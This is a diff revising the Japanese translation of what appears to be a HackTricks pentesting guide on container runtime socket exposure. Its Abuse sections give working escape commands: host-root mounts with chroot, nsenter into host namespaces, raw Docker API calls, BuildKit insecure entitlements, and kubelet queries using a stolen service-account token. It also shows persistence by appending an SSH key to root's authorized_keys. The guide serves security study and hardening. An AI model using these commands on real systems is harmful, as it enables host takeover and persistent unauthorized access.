@@ -4,17 +4,17 @@
 
 ## 概要
 
-実際のコンテナ侵害の多くは、namespace escape から始まるわけではありません。runtime control plane へのアクセスから始まります。ワークロードが、マウントされた Unix socket や公開された TCP listener を通じて `dockerd`、`containerd`、CRI-O、Podman、kubelet と通信できる場合、攻撃者はより高い権限を持つ新しいコンテナの作成、ホストの filesystem のマウント、ホスト namespace への参加、または機密性の高いノード情報の取得を要求できる可能性があります。このような場合、runtime API が実質的なセキュリティ境界であり、その侵害はホスト侵害にほぼ等しいものです。
+実際のコンテナ侵害の多くは、namespace escape から始まるわけではありません。runtime の control plane へのアクセスから始まります。ワークロードが、マウントされた Unix socket や公開された TCP listener 経由で `dockerd`、`containerd`、CRI-O、Podman、kubelet と通信できる場合、攻撃者はより高い権限を持つ新しいコンテナの作成、host filesystem のマウント、host namespace への参加、機密性の高い node 情報の取得を要求できる可能性があります。この場合、runtime API が実質的なセキュリティ境界であり、その侵害は事実上、host の侵害に近いものです。
 
-このため、runtime socket の露出は kernel の保護機能とは別に記録する必要があります。通常の seccomp、capabilities、MAC confinement が適用されたコンテナでも、`/var/run/docker.sock` や `/run/containerd/containerd.sock` がコンテナ内にマウントされていれば、API 呼び出しひとつでホストを侵害される可能性があります。現在のコンテナの kernel isolation は設計どおりに機能していても、runtime management plane は完全に露出していることがあります。
+このため、runtime socket の露出は kernel の保護とは分けて記録すべきです。通常の seccomp、capability、MAC による制限が適用されたコンテナでも、`/var/run/docker.sock` や `/run/containerd/containerd.sock` が内部にマウントされていれば、API 呼び出しひとつで host が侵害される可能性があります。現在のコンテナに対する kernel isolation が設計どおりに機能していても、runtime の管理 plane が完全に露出していることがあります。
 
-## Daemon のアクセスモデル
+## Daemon へのアクセスモデル
 
-Docker Engine は従来、ローカルの Unix socket `unix:///var/run/docker.sock` を通じて、特権を持つ API を公開しています。歴史的には、`tcp://0.0.0.0:2375` のような TCP listener や、TLS で保護された `2376` の listener を通じて、リモートにも公開されていました。強力な TLS とクライアント認証なしで daemon をリモートに公開すると、実質的に Docker API がリモートの root インターフェースになります。
+Docker Engine は従来、`unix:///var/run/docker.sock` のローカル Unix socket 経由で、特権を持つ API を公開してきました。また、歴史的には `tcp://0.0.0.0:2375` のような TCP listener や、TLS で保護された `2376` の listener を通じてリモートにも公開されていました。強力な TLS と client 認証なしで daemon をリモート公開すると、実質的に Docker API がリモート root インターフェースになります。
 
-containerd、CRI-O、Podman、kubelet も同様に影響の大きい攻撃対象領域を公開しています。名前やワークフローは異なりますが、仕組みは同じです。呼び出し元がワークロードの作成、ホストパスのマウント、認証情報の取得、または実行中のコンテナの変更を行えるインターフェースは、特権を持つ管理用チャネルであり、それに応じて扱う必要があります。
+containerd、CRI-O、Podman、kubelet も同様に影響の大きい攻撃対象領域を公開しています。名前やワークフローは異なりますが、仕組みは同じです。呼び出し元がワークロードの作成、host path のマウント、認証情報の取得、実行中コンテナの変更を行えるインターフェースは、特権を持つ管理チャネルであり、それに応じた扱いが必要です。
 
-コンテナ管理用の Web UI も、ローカルアカウントに socket への直接アクセスを与えずに、同じ境界を露出させることがあります。たとえば、[Portainer issue #493](https://github.com/portainer/portainer/issues/493) では、旧版の 1.11.1 ビルドにおける認証不要の administrator password reset が報告されています。ローカルからアクセス可能な UI は、調査の手がかりとしてのみ扱ってください。インストール済みビルドと認証動作、実際に administrator 権限を制御できるか、管理対象の endpoint で書き込み可能なホスト bind mount を使ってコンテナを作成できるかを確認してください。[Portainer のドキュメント](https://docs.portainer.io/admin/environments/add/docker/socket)によると、socket を使った管理には Docker socket へのアクセスが必要です。rootless または制限付きの endpoint であれば、ホストへの影響は異なります。プロセス名、ポート、バージョン文字列だけから、認証の欠陥やホスト root へのアクセスを推測しないでください。
+コンテナ管理用の web UI も、ローカルアカウントに socket への直接アクセスを与えることなく、同じ境界を露出させる可能性があります。たとえば、[Portainer issue #493](https://github.com/portainer/portainer/issues/493) では、旧版 1.11.1 における認証不要の administrator password reset が記録されています。ローカルから到達可能な UI は、あくまで調査の手がかりとして扱ってください。インストール済みビルドと認証動作、実際に administrator 権限を制御できるか、管理対象の endpoint で書き込み可能な host bind mount を使ってコンテナを作成できるかを確認してください。[Portainer のドキュメント](https://docs.portainer.io/admin/environments/add/docker/socket)によると、socket を使った管理には Docker socket へのアクセスが必要です。rootless または制限された endpoint では、host への影響が異なります。プロセス名、port、version string だけから、認証上の欠陥や host-root access があると推測しないでください。
 
 確認すべき一般的なローカルパスは次のとおりです。
 
@@ -29,24 +29,24 @@ containerd、CRI-O、Podman、kubelet も同様に影響の大きい攻撃対象
 /run/firecracker-containerd.sock
 ```
 
-古いスタックや、より特殊なスタックでは、`dockershim.sock`、`frakti.sock`、`rktlet.sock` などのエンドポイントも公開されている場合があります。これらは現代の環境ではあまり一般的ではありませんが、見つかった場合は、通常のアプリケーション用ソケットではなくランタイム制御用のインターフェースであるため、同様に慎重に扱う必要があります。
+古い環境や、より特殊なスタックでは、`dockershim.sock`、`frakti.sock`、`rktlet.sock` などのエンドポイントが公開されている場合もあります。これらは現代の環境ではあまり一般的ではありませんが、見つかった場合は、通常のアプリケーションソケットではなくランタイム制御用のインターフェースであるため、同様に注意して扱う必要があります。
 
-## 安全なリモートアクセス
+## Secure Remote Access
 
-デーモンをローカルソケットの外部に公開する必要がある場合、接続は TLS で保護し、できれば相互認証を使用して、デーモンとクライアントの双方が相手を検証できるようにする必要があります。利便性のために Docker デーモンを平文 HTTP で公開する古い慣習は、コンテナ管理における最も危険な過ちのひとつです。API の機能が強力なため、特権コンテナを直接作成できてしまうからです。
+デーモンをローカルソケットの外部に公開する必要がある場合、接続は TLS で保護し、できれば相互認証を有効にして、デーモンがクライアントを検証し、クライアントがデーモンを検証できるようにする必要があります。利便性のために Docker デーモンを平文 HTTP で公開する昔ながらの習慣は、コンテナ管理における最も危険なミスの一つです。これは、API の機能が強力で、特権コンテナを直接作成できるためです。
 
-Docker の歴史的な設定パターンは次のようなものでした。
+歴史的な Docker の設定パターンは次のようなものでした：
 
 ```bash
 DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
 sudo service docker restart
 ```
 
-systemdベースのホストでは、daemonとの通信が`fd://`として示される場合もあります。これは、daemonが自ら直接bindするのではなく、systemdから事前にopenされたsocketをプロセスが継承することを意味します。重要なのは正確な構文ではなく、セキュリティ上の影響です。daemonが厳格な権限設定のローカルsocket以外でlistenした時点で、transport securityとclient authenticationは任意のhardeningではなく、必須になります。
+systemdベースのホストでは、デーモンとの通信が `fd://` として現れることもあります。これは、デーモン自身がソケットを直接バインドするのではなく、systemdから事前に開かれたソケットをプロセスが引き継ぐことを意味します。重要なのは正確な構文ではなく、セキュリティ上の影響です。デーモンが厳格な権限設定のローカルソケットを超えてリッスンした時点で、トランスポートセキュリティとクライアント認証は、任意の強化策ではなく必須になります。
 
-## 悪用
+## Abuse
 
-runtime socketが存在する場合は、それが何か、互換性のあるclientがあるか、raw HTTPまたはgRPCでアクセスできるかを確認します:
+runtime socketが存在する場合は、それがどのsocketなのか、互換性のあるクライアントがあるか、raw HTTPまたはgRPCでアクセスできるかを確認します。
 
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
@@ -60,11 +60,11 @@ crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
 buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
 ```
 
-これらのコマンドは、存在しないパス、マウントされているがアクセスできないソケット、稼働中の特権 API を区別するのに役立ちます。クライアントから接続できた場合、次に確認するのは、その API を使ってホストの bind mount またはホストの namespace 共有を指定した新しいコンテナを起動できるかどうかです。
+これらのコマンドは、存在しないパス、マウントされているがアクセスできないソケット、稼働中の特権 API を区別するのに役立ちます。クライアントから接続できた場合、次に確認すべきなのは、その API を使ってホストの bind mount またはホスト namespace の共有を指定した新しいコンテナを起動できるかどうかです。
 
 ### クライアントがインストールされていない場合
 
-`docker`、`podman` などの使いやすい CLI がないからといって、ソケットが安全だとは限りません。Docker Engine は Unix ソケット上で HTTP を使い、Podman は `podman system service` を通じて Docker 互換 API と Libpod ネイティブ API の両方を公開します。そのため、`curl` だけの最小限の環境でも、デーモンを操作できる可能性があります。
+`docker`、`podman`、その他の使いやすい CLI が存在しなくても、ソケットが安全とは限りません。Docker Engine は Unix ソケット経由で HTTP を扱い、Podman は `podman system service` を通じて、Docker 互換 API と Libpod ネイティブ API の両方を公開しています。つまり、`curl` しかない最小限の環境でも、デーモンを操作できる可能性があります。
 
 ```bash
 curl --unix-socket /var/run/docker.sock http://localhost/_ping
@@ -78,35 +78,37 @@ curl --unix-socket /run/podman/podman.sock http://d/_ping
 curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
 ```
 
-これは post-exploitation で重要です。防御側が通常のクライアントバイナリを削除しても、管理用ソケットはマウントされたままの場合があるためです。Podman ホストでは、rootful と rootless のデプロイで重要なパスが異なる点に注意してください。rootful のサービスインスタンスでは `unix:///run/podman/podman.sock`、rootless では `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。
+PHP code execution が `open_basedir` に制限されている場合でも、PHP プロセスに接続する OS 権限があれば、[Unix socket 接続は別の経路として残ります](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir)。
 
-### 完全な例: Docker Socket から Host Root へ
+これは post-exploitation で重要です。防御側が通常のクライアントバイナリを削除しても、管理 socket はマウントされたままの場合があるためです。Podman ホストでは、rootful と rootless のデプロイで重要なパスが異なることに注意してください。rootful サービスインスタンスでは `unix:///run/podman/podman.sock`、rootless では `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。
 
-`docker.sock` にアクセスできる場合、典型的なエスケープ方法は、ホストのルートファイルシステムをマウントする新しいコンテナを起動し、その中で `chroot` することです。
+### 完全な例: Docker Socket からホストの root へ
+
+`docker.sock` にアクセスできる場合、古典的な escape は、ホストの root ファイルシステムをマウントした新しいコンテナを起動し、その中で `chroot` を実行する方法です。
 
 ```bash
 docker -H unix:///var/run/docker.sock images
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
 ```
 
-これは Docker daemon を介した、ホスト上での root 権限による直接実行を可能にします。影響はファイルの読み取りにとどまりません。新しいコンテナ内に入った攻撃者は、ホスト上のファイルを改変したり、認証情報を収集したり、永続化を仕掛けたり、追加の特権ワークロードを起動したりできます。
+これはDocker daemonを通じて、ホストのroot権限で直接実行できる状態をもたらします。影響はファイルの読み取りにとどまりません。新しいcontainer内に入った攻撃者は、ホスト上のファイルを改変したり、認証情報を収集したり、永続化を仕込んだり、追加の特権ワークロードを起動したりできます。
 
-### 完全な例: Docker Socket からホストの Namespace へ
+### 完全な例: Docker Socket からホストのNamespacesへ
 
-攻撃者がファイルシステムのみへのアクセスではなく、namespace への侵入を選ぶ場合:
+攻撃者がファイルシステムだけにアクセスするのではなく、namespaceへの侵入を選ぶ場合:
 
 ```bash
 docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 ```
 
-この経路では、現在のコンテナを悪用するのではなく、ホストの namespace を明示的に公開して新しいコンテナを作成するよう runtime に要求することで、ホストに到達します。
+この経路では、現在のコンテナを exploit するのではなく、runtime に明示的な host namespace の公開を伴う新しいコンテナを作成させて、host に到達します。
 
 ### Docker Socket Persistence Pattern
 
-runtime の制御は、一度きりの shell ではなく、persistence にも利用できます。一般的なパターンは、ホストのマウントを持つ helper container を作成し、許可されたアクセス情報または起動 hook をマウントされたホストのファイルシステムに書き込み、ホストがそれを取り込むことを検証することです。
+runtime の制御は、一度限りの shell ではなく、persistence にも利用できます。一般的なパターンは、host mount を持つ helper container を作成し、mount された host filesystem に認可済みのアクセス情報または startup hook を書き込み、host がそれを読み込むことを検証する方法です。
 
-例の形式:
+例：
 
 ```bash
 docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
@@ -115,11 +117,11 @@ docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
 docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
 ```
 
-同じ考え方は、オペレーターが何を証明したいかに応じて、systemd units、cron fragments、application startup files、SSH keys を対象にできます。重要なのは、永続的な変更が元のコンテナ内で追加の権限を得て行われるのではなく、runtime daemon のホストレベルの filesystem authority を通じて行われる点です。
+同じ考え方で、運用者が証明したい内容に応じて、systemd units、cron fragments、アプリケーションの起動ファイル、SSH keysを対象にできます。重要なのは、永続的な変更が元のコンテナ内で追加の権限を得て行われるのではなく、runtime daemonが持つホストレベルのファイルシステム権限を通じて行われることです。
 
 ### Raw Docker API Helper Pivot
 
-Docker CLI がない場合、同じ host-mount helper flow を Unix socket 経由の HTTP で実行できます。一般的な流れは、API を確認し、ホスト bind mount を使う helper container を作成して起動し、exec instance を作成して起動することです。
+Docker CLIがない場合、同じホストマウントのhelperフローを、Unix socket経由のHTTPで実行できます。一般的な流れは、APIを確認し、ホストのbind mountを使うhelper containerを作成して起動し、exec instanceを作成して、そのexecを開始することです。
 
 ```bash
 curl --unix-socket /var/run/docker.sock http://localhost/_ping
@@ -134,11 +136,11 @@ curl --unix-socket /var/run/docker.sock \
   -X POST http://localhost/v1.54/containers/helper/exec
 ```
 
-最終的な `/exec/<id>/start` リクエストは返された exec ID に依存しますが、セキュリティ上の要点は正確な JSON の処理方法とは無関係です。rootful Docker daemon への raw API access があれば、より強力な helper workload を要求できます。
+最終的な`/exec/<id>/start`リクエストは、返されたexec IDに依存しますが、セキュリティ上の要点は具体的なJSON処理とは無関係です。rootful Docker daemonへのraw APIアクセスがあれば、より強力なヘルパーワークロードを要求できます。
 
-### 全体例: containerd Socket
+### 完全な例: containerd Socket
 
-マウントされた `containerd` socket も、通常は同じくらい危険です:<sup>[[1]](#references)</sup>
+マウントされた`containerd` socketも、通常は同じくらい危険です:<sup>[[1]](#references)</sup>
 
 ```bash
 ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
@@ -146,7 +148,7 @@ ctr --address /run/containerd/containerd.sock run --tty --privileged --mount typ
 chroot /host /bin/sh
 ```
 
-Dockerに近いクライアントがある場合、`nerdctl` は `ctr` より便利です。`--privileged`、`--pid=host`、`-v` などの使い慣れたフラグを使えるためです。
+より Docker に近いクライアントが利用できる場合、`nerdctl` は `--privileged`、`--pid=host`、`-v` などの見慣れたフラグを使えるため、`ctr` より便利です。
 
 ```bash
 nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
@@ -154,11 +156,11 @@ nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -i
 chroot /host /bin/sh
 ```
 
-影響は再びホスト侵害です。Docker専用のツールがなくても、別の runtime API が同じ管理者権限を提供している可能性があります。Kubernetes ノードでは、`crictl` が CRI endpoint に直接アクセスするため、偵察やコンテナ操作に使える場合もあります。
+影響はやはりホストの侵害です。Docker固有のツールがなくても、別のruntime APIが同じ管理権限を提供している可能性があります。Kubernetesノードでは、`crictl`もCRIエンドポイントに直接接続するため、偵察やコンテナ操作に十分な場合があります。
 
-### BuildKit ソケット
+### BuildKit Socket
 
-`buildkitd` は、「単なるビルドバックエンド」と考えられがちなため見落とされやすいものの、この daemon は依然として特権を持つ control plane です。アクセス可能な `buildkitd.sock` があると、攻撃者は任意のビルドステップを実行し、worker の機能を調査し、侵害された環境のローカルコンテキストを利用し、daemon 側で許可されている場合は `network.host` や `security.insecure` などの危険な entitlement を要求できます。
+`buildkitd`は、単なる「ビルドバックエンド」と考えられがちなため見落とされやすいものの、このデーモンは依然として特権を持つコントロールプレーンです。アクセス可能な`buildkitd.sock`があると、攻撃者は任意のビルドステップを実行し、workerの機能を調べ、侵害された環境のローカルコンテキストを利用できます。また、デーモンが許可する設定になっていれば、`network.host`や`security.insecure`などの危険なentitlementを要求できます。
 
 最初に試すとよい操作は次のとおりです。
 
@@ -167,7 +169,7 @@ buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
 buildctl --addr unix:///run/buildkit/buildkitd.sock du
 ```
 
-daemon が build requests を受け付ける場合は、insecure entitlements が利用可能かテストします。
+デーモンがビルドリクエストを受け付ける場合は、insecure entitlements が利用可能かテストします。
 
 ```bash
 buildctl --addr unix:///run/buildkit/buildkitd.sock build \
@@ -179,13 +181,13 @@ buildctl --addr unix:///run/buildkit/buildkitd.sock build \
   --output type=local,dest=/tmp/buildkit-out
 ```
 
-影響の正確な範囲は daemon の設定によって異なりますが、entitlements が寛容な rootful BuildKit サービスは、無害な開発者向けの利便機能ではありません。特に CI runners や共有ビルドノードでは、価値の高い管理用攻撃対象領域として扱ってください。
+影響の具体的な範囲は daemon の設定によって異なりますが、entitlements が permissive な rootful BuildKit service は、無害な開発者向けの利便機能ではありません。特に CI runners や共有 build node では、価値の高い管理用 attack surface として扱ってください。
 
-### TCP 経由の Kubelet API
+### Kubelet API Over TCP
 
-kubelet は container runtime ではありませんが、ノード管理プレーンの一部であり、信頼境界の議論でも同じ範囲に含まれることがよくあります。kubelet のセキュアポート `10250` に workload から到達できる場合や、ノードの認証情報、kubeconfigs、またはプロキシ権限が露出している場合、攻撃者は Kubernetes API server の admission path に一切触れることなく、Pod の列挙、ログの取得、ノード上のコンテナ内でのコマンド実行ができる可能性があります。
+kubelet は container runtime ではありませんが、node management plane の一部であり、同じ trust boundary の議論に含まれることがよくあります。kubelet の secure port `10250` に workload から到達できる場合や、node credentials、kubeconfigs、proxy 権限が露出している場合、攻撃者は Kubernetes API server の admission path に一切触れることなく、Pod の列挙、ログの取得、node-local container でのコマンド実行を行える可能性があります。
 
-まずは手軽な調査から始めます。
+まずは手軽な discovery から始めます:
 
 ```bash
 curl -sk https://127.0.0.1:10250/pods
@@ -194,11 +196,11 @@ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
 ```
 
-kubelet または API-server proxy path が `exec` を許可している場合、WebSocket 対応クライアントを使って、ノード上の他のコンテナで code execution を実行できます。これが、`nodes/proxy` に `get` 権限しかなくても、見た目以上に危険な理由でもあります。このリクエストは、コマンドを実行する kubelet endpoint に到達する可能性があり、kubelet との直接的なやり取りは通常の Kubernetes audit logs には記録されません。<sup>[[2]](#references)</sup>
+kubelet または API-server proxy の経路で `exec` が許可されている場合、WebSocket に対応したクライアントを使うことで、ノード上の他のコンテナでコードを実行できます。これが、`get` 権限しかなくても `nodes/proxy` が聞こえる以上に危険な理由でもあります。リクエストはコマンドを実行する kubelet エンドポイントに到達でき、こうした kubelet への直接的な操作は通常の Kubernetes audit log には記録されません。<sup>[[2]](#references)</sup>
 
-## チェック
+## Checks
 
-これらのチェックの目的は、コンテナが、信頼境界の外に置かれているべき管理プレーンに到達できるかどうかを確認することです。
+これらのチェックでは、コンテナが信頼境界の外にあるべき管理プレーンに到達できるかどうかを確認します。
 
 ```bash
 mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
@@ -209,22 +211,24 @@ find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' 
 
 ここで注目すべき点:
 
-- マウントされた runtime socket は、単なる情報開示ではなく、通常は直接的な管理権限を与える手段です。
+- マウントされた runtime socket は、単なる情報開示ではなく、通常は直接的な管理操作手段となります。
 - TLS なしで `2375` をリッスンする TCP listener は、リモート侵害につながる状態として扱うべきです。
-- `DOCKER_HOST` などの環境変数から、ワークロードがホストの runtime と通信するよう意図的に設計されていることが分かる場合があります。
+- `DOCKER_HOST` などの環境変数から、workload がホストの runtime と通信するよう意図的に設計されていることが分かる場合があります。
 
 ## Runtime のデフォルト設定
 
-| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動での弱体化 |
+| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動でのセキュリティ低下 |
 | --- | --- | --- | --- |
-| Docker Engine | デフォルトではローカル Unix socket | `dockerd` はローカル socket をリッスンし、daemon は通常 rootful です | `/var/run/docker.sock` のマウント、`tcp://...:2375` の公開、`2376` での TLS の設定が弱い、または未設定 |
-| Podman | デフォルトでは daemonless CLI | 通常のローカル利用では、常時稼働する特権 daemon は不要です。`podman system service` が有効な場合、API socket が公開されることはあります | `podman.sock` の公開、service の広範な公開、rootful API の利用 |
-| containerd | ローカルの特権 socket | 管理 API はローカル socket 経由で公開され、通常は上位レベルのツールから利用されます | `containerd.sock` のマウント、`ctr` または `nerdctl` への広範なアクセス、特権 namespace の公開 |
-| CRI-O | ローカルの特権 socket | CRI endpoint は、ノード内の信頼されたコンポーネントからの利用を想定しています | `crio.sock` のマウント、信頼されていないワークロードへの CRI endpoint の公開 |
-| Kubernetes kubelet | ノードローカルの管理 API | kubelet を Pods から広く到達可能にすべきではありません。認証と認可の設定によっては、アクセスにより Pod の状態、認証情報、実行機能が漏れる可能性があります | kubelet の socket や証明書のマウント、kubelet 認証の弱さ、ホストネットワークの利用と到達可能な kubelet endpoint の組み合わせ |
+| Docker Engine | デフォルトではローカルの Unix socket | `dockerd` はローカル socket でリッスンし、通常 daemon は rootful で動作します | `/var/run/docker.sock` のマウント、`tcp://...:2375` の公開、`2376` での TLS の不備または未設定 |
+| Podman | デフォルトでは daemonless CLI | 通常のローカル利用では、常時稼働する特権 daemon は不要です。`podman system service` が有効な場合、API socket が公開されることがあります | `podman.sock` の公開、service の広範な公開、rootful API の使用 |
+| containerd | ローカルの特権 socket | 管理 API はローカル socket 経由で公開され、通常は上位レイヤーのツールから利用されます | `containerd.sock` のマウント、広範な `ctr` または `nerdctl` へのアクセス、特権 namespace の公開 |
+| CRI-O | ローカルの特権 socket | CRI endpoint はノード内の信頼されたコンポーネント向けです | `crio.sock` のマウント、信頼されていない workload への CRI endpoint の公開 |
+| Kubernetes kubelet | ノード内の管理 API | kubelet は Pod から広範に到達できる状態にすべきではありません。認証・認可の設定によっては、アクセスにより Pod の状態、認証情報、実行機能が露出する可能性があります | kubelet socket または証明書のマウント、kubelet の認証の不備、host networking と到達可能な kubelet endpoint の併用 |
+
+
 
 ## References
 
-- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
-- [2] [Kubernetes API Server のバイパスに伴うリスク](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
+- [1] [containerd socket の悪用 パート1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
+- [2] [Kubernetes API Server のバイパスリスク](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
 {{#include ../../../banners/hacktricks-training.md}}
